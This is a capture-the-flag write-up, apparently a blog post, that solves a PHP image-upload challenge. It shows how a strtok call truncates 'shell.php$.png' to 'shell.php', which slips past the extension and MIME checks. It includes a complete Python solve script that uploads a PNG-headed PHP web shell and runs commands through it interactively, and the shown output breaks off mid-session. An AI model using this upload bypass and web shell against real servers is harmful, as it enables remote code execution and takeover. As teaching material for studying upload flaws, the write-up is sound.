## The Solution


The only thing that comes to my mind after reading the source code is LFI to RCE vuln. But the question is how?

The backend implementation seems pretty secure since it checks:
- The file extension from the `$allowedExtensions = ["jpg", "jpeg", "png"]`
- And also the mime type by the file headers

So the only way we can successfully upload a file on their server is to upload an actual image ( or at least the image headers ) with the file extension `.jpg`, `.jpeg` or `.png`.

However if you take a closer look at the code, you will find a weird line `$fileName = strtok($fileName, chr(7841151584512418084));`. If the above conditions are met and the image is uploaded successfully, then the `$fileName` is modified just before storing it on the filesystem. But how exactly is it modified? According to the [official PHP documentation](https://www.php.net/manual/en/function.strtok.php):
> strtok() splits a string (string) into smaller strings (tokens), with each token being delimited by any character from token. That is, if you have a string like "This is an example string" you could tokenize this string into its individual words by using the space character as the token.

Basically if you have something like `strtok('This is a string', ' ')`, it will return `This`, similarly the weird looking line will replace `fileName` to a substring until the character 7841151584512418084. According to PHP that character is `$`:
```console
php > echo(chr(7841151584512418084));
$
php >
```

This is cool, because if we inject PHP backdoor into a PNG file and rename it as `shell.php$.png` it will pass both the checks since it has PNG magic bytes and a `.png` extension. Also before saving it, it should be renamed to `shell.php` allowing us to successfully upload a php backdoor. Let's test this locally:
```console
php > echo(strtok('shell.php$.png', chr(7841151584512418084)));
shell.php
php >
```

Since it works, let's make a simply python script to pop a pseudo-shell:
```python
import requests
import re

header = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'
payload = b'<?php system($_GET["cmd"]); __halt_compiler(); ?>'

filename = 'shell.php$.png'

with open(filename, 'wb') as f:
    f.write(header)
    f.write(payload)

url = 'http://35.222.114.240:8002/chal/'

with requests.Session() as session:
    try:
        with open(filename, "rb") as file:
            files = {"file": file}
            data = {"name": "VulnX"}  # Separate data for the "name" field
            response = session.post(url + 'upload.php', files=files, data=data)

            link = url + re.search("a href='(.*?)'", response.text).group(1)

            while(1):
                cmd = input('$ ')
                response = session.get(link + '?cmd=' + requests.utils.quote(cmd))
                print(response.text)

    except requests.exceptions.RequestException as e:
        print("Error:", e)
```
{: file="solve.py"}

And obviously get the flag:
```console
> python solve.py
$ id

uid=1000(ctf-player) gid=1000(ctf-player) groups=1000(ctf-player)

$ ls /var/www/html/chal
